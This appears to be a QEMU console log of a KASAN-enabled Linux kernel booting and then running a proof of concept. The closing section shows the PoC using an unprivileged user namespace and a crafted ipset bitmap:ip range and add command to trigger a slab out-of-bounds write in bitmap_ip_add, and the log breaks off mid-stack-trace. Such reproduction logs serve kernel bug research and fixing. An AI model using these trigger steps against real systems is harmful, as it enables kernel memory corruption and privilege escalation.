bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.12.0-rc4-00229-g041bd1e4f2d8-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 15:07:29 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 343340584 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000005] tsc: Detected 3187.200 MHz processor
[    0.000318] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000335] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000337] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002023] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002028] Using GB pages for direct mapping
[    0.002028] Incomplete global flushes, disabling PCID
[    0.002351] RAMDISK: [mem 0x7fe91000-0x7ffdffff]
[    0.002356] ACPI: Early table checksum verification disabled
[    0.002357] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002360] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002365] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002368] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002370] ACPI: FACS 0x000000007FFE0000 000040
[    0.002371] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002373] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002374] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002375] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002376] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002377] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002377] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002378] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002378] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002549] No NUMA configuration found
[    0.002550] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002551] NODE_DATA(0) allocated [mem 0x7fe8d940-0x7fe90fff]
[    0.002559] Zone ranges:
[    0.002559]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002560]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002561]   Normal   empty
[    0.002562] Movable zone start for each node
[    0.002562] Early memory node ranges
[    0.002562]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002563]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002564] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.005163] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.005202] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.029550] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.228398] kasan: KernelAddressSanitizer initialized
[    0.228592] ACPI: PM-Timer IO Port: 0x608
[    0.228601] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.228629] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.228631] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.228632] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.228633] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.228634] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.228634] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.228636] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.228637] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.228640] TSC deadline timer available
[    0.228642] CPU topo: Max. logical packages:   1
[    0.228642] CPU topo: Max. logical dies:       1
[    0.228643] CPU topo: Max. dies per package:   1
[    0.228644] CPU topo: Max. threads per core:   1
[    0.228645] CPU topo: Num. cores per package:     2
[    0.228646] CPU topo: Num. threads per package:   2
[    0.228646] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.228658] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.228669] kvm-guest: KVM setup pv remote TLB flush
[    0.228671] kvm-guest: setup PV sched yield
[    0.228677] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.228678] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.228678] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.228679] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.228680] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.228681] Booting paravirtualized kernel on KVM
[    0.228683] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.237050] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.239466] percpu: Embedded 68 pages/cpu s241496 r8192 d28840 u1048576
[    0.239497] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.239533] random: crng init done
[    0.239626] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.241074] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.241105] Fallback order for Node 0: 0 
[    0.241108] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.241108] Policy zone: DMA32
[    0.241110] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.241111] stackdepot: allocating hash table via alloc_large_system_hash
[    0.241112] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.267707] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.268762] Dynamic Preempt: voluntary
[    0.269545] rcu: Preemptible hierarchical RCU implementation.
[    0.269546] rcu: 	RCU event tracing is enabled.
[    0.269547] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.269548] 	Trampoline variant of Tasks RCU enabled.
[    0.269549] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.269549] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.269561] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.275937] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.276168] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.278388] Console: colour VGA+ 80x25
[    0.278418] printk: legacy console [ttyS0] enabled
[    0.316569] ACPI: Core revision 20240827
[    0.316914] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.317480] APIC: Switch to symmetric I/O mode setup
[    0.317764] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.318174] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.318697] kvm-guest: setup PV IPIs
[    0.319506] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.319858] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.320448] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.321520] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.321922] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.322446] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.322774] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.323448] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.323901] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.324232] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.324446] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.324857] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.325446] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.325913] MMIO Stale Data: Unknown: No mitigations
[    0.326187] Register File Data Sampling: Vulnerable: No microcode
[    0.326457] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.326889] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.327446] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.327805] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.328248] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.328446] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.328796] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.345095] Freeing SMP alternatives memory: 48K
[    0.345371] pid_max: default: 32768 minimum: 301
[    0.345488] LSM: initializing lsm=capability,selinux
[    0.345791] SELinux:  Initializing.
[    0.346116] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.346449] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.347570] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.348277] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.348470] signal: max sigframe size: 3632
[    0.348739] rcu: Hierarchical SRCU implementation.
[    0.349012] rcu: 	Max phase no-delay instances is 400.
[    0.349366] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.349796] smp: Bringing up secondary CPUs ...
[    0.350180] smpboot: x86: Booting SMP configuration:
[    0.350448] .... node  #0, CPUs:      #1
[    0.350525] smp: Brought up 1 node, 2 CPUs
[    0.350936] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.351608] Memory: 1675404K/2096632K available (51200K kernel code, 8611K rwdata, 11132K rodata, 5960K init, 1580K bss, 416188K reserved, 0K cma-reserved)
[    0.353531] devtmpfs: initialized
[    0.355606] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.356452] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.356978] PM: RTC time: 15:10:08, date: 2026-05-05
[    0.357410] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.358634] audit: initializing netlink subsys (disabled)
[    0.358958] audit: type=2000 audit(1777993809.018:1): state=initialized audit_enabled=0 res=1
[    0.358958] thermal_sys: Registered thermal governor 'step_wise'
[    0.359448] thermal_sys: Registered thermal governor 'user_space'
[    0.359839] cpuidle: using governor menu
[    0.360642] PCI: Using configuration type 1 for base access
[    0.361098] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.361601] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.362080] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.362639] ACPI: Added _OSI(Module Device)
[    0.362940] ACPI: Added _OSI(Processor Device)
[    0.363237] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.363448] ACPI: Added _OSI(Processor Aggregator Device)
[    0.369903] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.371635] ACPI: Interpreter enabled
[    0.371894] ACPI: PM: (supports S0 S3 S4 S5)
[    0.372199] ACPI: Using IOAPIC for interrupt routing
[    0.372473] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.373109] PCI: Using E820 reservations for host bridge windows
[    0.373769] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.384370] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.384457] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.385016] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.385495] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.386416] PCI host bridge to bus 0000:00
[    0.386469] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.386938] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.387432] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.387449] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.387985] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.388451] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.388876] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.393054] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.397052] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.398405] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.398807] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.399450] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.399903] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.400393] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.400592] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.401369] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.401452] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.402111] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.402973] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.403886] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.405635] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.406111] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.410042] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.410737] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.411447] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.413071] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.417802] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.418793] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.419556] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.420286] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.421151] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.422357] iommu: Default domain type: Translated
[    0.422447] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.422957] SCSI subsystem initialized
[    0.423213] ACPI: bus type USB registered
[    0.423480] usbcore: registered new interface driver usbfs
[    0.423807] usbcore: registered new interface driver hub
[    0.424123] usbcore: registered new device driver usb
[    0.424452] pps_core: LinuxPPS API ver. 1 registered
[    0.424736] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.425259] PTP clock support registered
[    0.425499] Advanced Linux Sound Architecture Driver Initialized.
[    0.426178] NetLabel: Initializing
[    0.426447] NetLabel:  domain hash size = 128
[    0.426699] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.427055] NetLabel:  unlabeled traffic allowed by default
[    0.427456] PCI: Using ACPI for IRQ routing
[    0.427777] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.427817] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.428148] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.428447] vgaarb: loaded
[    0.428660] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.428942] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.432488] clocksource: Switched to clocksource kvm-clock
[    0.433003] VFS: Disk quotas dquot_6.6.0
[    0.433234] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.433879] pnp: PnP ACPI init
[    0.436221] pnp: PnP ACPI: found 6 devices
[    0.444827] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.445373] NET: Registered PF_INET protocol family
[    0.445693] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.446526] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.447016] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.447463] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.449082] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.449524] TCP: Hash tables configured (established 16384 bind 16384)
[    0.449931] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.450318] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.450786] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.451311] RPC: Registered named UNIX socket transport module.
[    0.451650] RPC: Registered udp transport module.
[    0.451921] RPC: Registered tcp transport module.
[    0.452190] RPC: Registered tcp-with-tls transport module.
[    0.452506] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.453196] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.453555] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.453910] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.454305] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.454702] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.455184] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.455530] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.455904] PCI: CLS 0 bytes, default 64
[    0.456322] Unpacking initramfs...
[    0.458405] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.458886] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.470207] Initialise system trusted keyrings
[    0.470573] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.471353] NFS: Registering the id_resolver key type
[    0.471372] Freeing initrd memory: 1340K
[    0.471658] Key type id_resolver registered
[    0.472132] Key type id_legacy registered
[    0.472430] 9p: Installing v9fs 9p2000 file system support
[    0.479193] Key type asymmetric registered
[    0.479470] Asymmetric key parser 'x509' registered
[    0.479785] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.480232] io scheduler mq-deadline registered
[    0.480503] io scheduler kyber registered
[    0.480924] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.481478] ACPI: button: Power Button [PWRF]
[    0.482063] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.482590] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.483761] Non-volatile memory driver v1.3
[    0.484007] Linux agpgart interface v0.103
[    0.484346] ACPI: bus type drm_connector registered
[    0.487061] loop: module loaded
[    0.488336] scsi host0: ata_piix
[    0.488729] scsi host1: ata_piix
[    0.489000] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.489446] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.490554] e100: Intel(R) PRO/100 Network Driver
[    0.490835] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.491164] e1000: Intel(R) PRO/1000 Network Driver
[    0.491453] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.646389] ata2: found unknown device (class 0)
[    0.647157] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.648231] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.663624] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.664325] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.675231] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.777306] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.061773] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.062171] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.062583] e1000e: Intel(R) PRO/1000 Network Driver
[    1.062878] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.063245] sky2: driver version 1.30
[    1.063702] usbcore: registered new interface driver usblp
[    1.064031] usbcore: registered new interface driver usb-storage
[    1.064437] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.065364] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.065659] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.066288] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.066875] rtc_cmos 00:05: RTC can wake from S4
[    1.067608] rtc_cmos 00:05: registered as rtc0
[    1.067927] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.068784] device-mapper: ioctl: 4.48.0-ioctl (2023-03-01) initialised: dm-devel@lists.linux.dev
[    1.069321] intel_pstate: CPU model not supported
[    1.069651] hid: raw HID events driver (C) Jiri Kosina
[    1.070420] usbcore: registered new interface driver usbhid
[    1.070747] usbhid: USB HID core driver
[    1.071752] Initializing XFRM netlink socket
[    1.072036] NET: Registered PF_INET6 protocol family
[    1.072703] Segment Routing with IPv6
[    1.072932] In-situ OAM (IOAM) with IPv6
[    1.073199] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.073749] NET: Registered PF_PACKET protocol family
[    1.074072] 9pnet: Installing 9P2000 support
[    1.074340] Key type dns_resolver registered
[    1.074846] IPI shorthand broadcast: enabled
[    1.082684] sched_clock: Marking stable (1040001324, 42271785)->(1090016016, -7742907)
[    1.083284] registered taskstats version 1
[    1.083521] Loading compiled-in X.509 certificates
[    1.089474] Demotion targets for Node 0: null
[    1.089818] PM:   Magic number: 10:575:183
[    1.090090] printk: legacy console [netcon0] enabled
[    1.090378] netconsole: network logging started
[    1.090720] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.091265] kworker/u8:1 (55) used greatest stack depth: 29664 bytes left
[    1.091995] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.092558] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.092976] ALSA device list:
[    1.093149]   No soundcards found.
[    1.094217] Freeing unused kernel image (initmem) memory: 5960K
[    1.095325] Write protecting the kernel read-only data: 63488k
[    1.095341] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.096228] cfg80211: failed to load regulatory.db
[    1.096726] Freeing unused kernel image (rodata/data gap) memory: 1156K
[    1.104325] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.104620] Run /init as init process
[    1.105289] mkdir (58) used greatest stack depth: 28840 bytes left
[    1.105780] mount (59) used greatest stack depth: 28304 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting
poc: entered user+net namespace (have CAP_NET_ADMIN)
poc: NETLINK_NETFILTER socket open
poc: created bitmap:ip V range 255.255.255.100-255.255.255.255
poc: triggering OOB via ipset add V 255.255.255.100/16 ...
[    1.112390] ==================================================================
[    1.112672] BUG: KASAN: slab-out-of-bounds in bitmap_ip_add+0xb99/0xed0
[    1.112939] Write of size 16 at addr ffff888009c9d3e8 by task poc/65
[    1.113185] 
[    1.113251] CPU: 1 UID: 0 PID: 65 Comm: poc Not tainted 6.12.0-rc4-00229-g041bd1e4f2d8-dirty #1
[    1.113587] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    1.113953] Call Trace:
[    1.114053]  <TASK>
[    1.114141]  dump_stack_lvl+0x53/0x70
[    1.114290]  print_report+0xce/0x660
[    1.114435]  ? bitmap_ip_add+0xb99/0xed0
[    1.114590]  kasan_report+0xc6/0x100
[    1.114736]  ? bitmap_ip_add+0xb99/0xed0
[    1.114891]  bitmap_ip_add+0xb99/0xed0
[    1.115041]  ? __pfx_bitmap_ip_add+0x10/0x10
[    1.115211]  ? __pfx__raw_spin_trylock+0x10/0x10
[    1.115394]  ? __pfx_bitmap_ip_add+0x10/0x10
[    1.115564]  bitmap_ip_uadt+0x5d9/0x9f0
[    1.115719]  ? __pfx_bitmap_ip_uadt+0x10/0x10
[    1.115892]  ? _raw_spin_lock_bh+0x84/0xe0
[    1.116054]  ? __pfx__raw_spin_lock_bh+0x10/0x10
[    1.116237]  ? unwind_next_frame+0xc42/0x2440
[    1.116412]  call_ad.constprop.0+0x124/0x8c0
[    1.116582]  ? __pfx_call_ad.constprop.0+0x10/0x10
[    1.116772]  ? alloc_workqueue+0x6a2/0x19f0
[    1.116938]  ? unwind_get_return_address+0x59/0xa0
[    1.117127]  ? arch_stack_walk+0xa7/0x100
[    1.117287]  ? __pfx___nla_validate_parse+0x10/0x10
[    1.117480]  ip_set_ad.constprop.0.isra.0+0x36f/0x7c0
[    1.117678]  ? __pfx_stack_trace_save+0x10/0x10
[    1.117861]  ? __pfx_ip_set_ad.constprop.0.isra.0+0x10/0x10
[    1.118077]  ? alloc_migration_target_by_mpol+0x250/0x3e0
[    1.118288]  ? kasan_save_stack+0x33/0x60
[    1.118447]  ? mutex_lock+0x8c/0xe0
[    1.118588]  ? __pfx_mutex_lock+0x10/0x10
[    1.118749]  nfnetlink_rcv_msg+0x654/0x8b0
[    1.118912]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    1.119094]  ? unwind_get_return_address+0x59/0xa0
[    1.119284]  ? kasan_save_stack+0x33/0x60
[    1.119443]  ? kasan_save_track+0x14/0x30
[    1.119601]  ? __kasan_slab_alloc+0x6e/0x70
[    1.119768]  ? kmem_cache_alloc_node_noprof+0xe2/0x280
[    1.119970]  ? kmalloc_reserve+0x139/0x230
[    1.120132]  ? __alloc_skb+0x10f/0x2d0
[    1.120282]  ? netlink_sendmsg+0x584/0xc00
[    1.120444]  ? ____sys_sendmsg+0x822/0xa00
[    1.120607]  ? ___sys_sendmsg+0x100/0x180
[    1.120767]  ? __sys_sendmsg+0xe6/0x190
[    1.120921]  ? do_syscall_64+0xa6/0x1a0
[    1.121075]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.121282]  netlink_rcv_skb+0x12f/0x370
[    1.121439]  ? __pfx_nfnetlink_rcv_msg+0x10/0x10
[    1.121622]  ? __pfx_netlink_rcv_skb+0x10/0x10
[    1.121802]  nfnetlink_rcv+0x14b/0x360
[    1.121952]  ? __kasan_slab_alloc+0x6e/0x70
[    1.122118]  ? __pfx_nfnetlink_rcv+0x10/0x10
[    1.122289]  ? _copy_from_iter+0x177/0x10d0
[    1.122457]  netlink_unicast+0x5c2/0x830
[    1.122614]  ? __pfx_netlink_unicast+0x10/0x10
[    1.122793]  ? ktime_get_mono_fast_ns+0x84/0x320
[    1.122977]  ? tty_kref_put+0x1c/0x1a0
